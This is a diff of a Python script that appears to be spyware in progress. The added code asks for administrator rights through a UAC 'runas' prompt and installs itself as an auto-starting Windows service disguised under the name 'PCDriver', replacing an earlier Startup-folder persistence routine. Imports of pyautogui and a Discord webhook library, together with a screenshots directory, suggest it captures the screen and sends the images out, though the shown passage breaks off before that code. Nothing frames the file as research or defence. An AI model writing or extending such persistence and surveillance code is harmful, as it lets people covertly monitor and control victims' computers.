@@ -1,15 +1,37 @@
+import os
+import ctypes
 import sys
-import shutil
 
-def add_to_startup():
-    startup = os.path.join(os.getenv('APPDATA'), 'Microsoft\\Windows\\Start Menu\\Programs\\Startup')
-    shutil.copy(sys.executable, startup)
+def elevate():
+    """Check for admin privileges and elevate if necessary."""
+    if ctypes.windll.shell32.IsUserAnAdmin():
+        return True
+    else:
+        # Request elevation
+        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, ' '.join(sys.argv), None, 1)
+        return False
 
-if __name__ == "__main__":
-    add_to_startup()
+def create_service():
+    """Create and start the service using the current script's path."""
+    # Get the absolute path of the current script
+    script_path = os.path.abspath(__file__)
+    
+    # Command to create the service
+    create_command = f'sc create PCDriver binPath= "{script_path}" start= auto'
+    
+    # Execute the command to create the service
+    os.system(create_command)
+    
+    # Start the service
+    os.system('sc start PCDriver')
+
+if __name__ == '__main__':
+    if elevate():
+        create_service()
+    else:
+        print("Failed to elevate privileges.")
 import pyautogui
 import time
-import os
 from discord_webhook import DiscordWebhook
 # Create a directory for screenshots if it doesn't exist
 screenshot_dir = "screenshots"
